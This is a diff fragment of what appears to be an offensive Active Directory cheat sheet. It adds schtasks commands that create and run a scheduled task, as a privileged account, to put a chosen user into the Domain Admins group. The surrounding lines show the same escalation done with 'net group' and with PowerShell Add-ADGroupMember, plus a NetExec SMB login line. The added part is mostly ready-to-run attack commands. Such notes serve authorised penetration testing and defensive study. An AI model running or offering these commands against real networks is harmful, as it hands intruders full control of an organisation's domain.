@@ -1014,6 +1014,15 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
   net group "Domain Admins" <username> /add /domain
   ```
 
+  #### Add user to Domain Admins by creating a scheduled task
+  ```Shell
+  schtasks /create /tn "AddDomainAdmin" /tr "net group \"domain admins\" <AD_User> /add /domain" /sc once /st 08:30 /ru "<Domain_Name\<Privilged_AD_User>"
+  ```
+
+  ```Shell
+  schtasks /run /tn "AddDomainAdmin"
+  ```
+
   #### Add an user to the domain admin
   ```ps
   powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
